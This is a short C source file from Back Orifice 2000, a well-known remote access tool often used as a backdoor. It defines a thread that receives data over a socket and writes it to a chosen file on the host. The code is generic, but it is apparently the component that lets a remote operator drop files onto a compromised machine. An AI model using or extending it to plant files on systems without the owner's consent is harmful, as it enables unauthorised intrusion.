/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<osversion.h>
#include<iohandler.h>
#include<functions.h>
#include<cmd\cmd_tcpip.h>
#include<pviewer.h>

//typedef struct __port_child_param {
//	SOCKET s;
//	SOCKADDR_IN saddr;
//	BOOL *pbDone;
//	int nArg1;
//	char *svArg2;
//	char *svArg3;
//} PORT_CHILD_PARAM;

DWORD WINAPI PortFileRecvThread(LPVOID lpParameter)
{
	PORT_CHILD_PARAM *ppcp=(PORT_CHILD_PARAM *) lpParameter;

	// Open target file

	HANDLE hFile;
	hFile=CreateFile(ppcp->svArg2,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile!=NULL) {
		int nBytes;
		DWORD dwCount;
		char svBuffer[1024];
			
		do {
			// Give up time
			Sleep(20);

			nBytes=recv(ppcp->s,svBuffer,1024,0);
			if(nBytes>0) {
				WriteFile(hFile,svBuffer,nBytes,&dwCount,NULL);
			}
		} while(nBytes>0);

		CloseHandle(hFile);
	}

	closesocket(ppcp->s);
	free(ppcp);
	return 0;
}

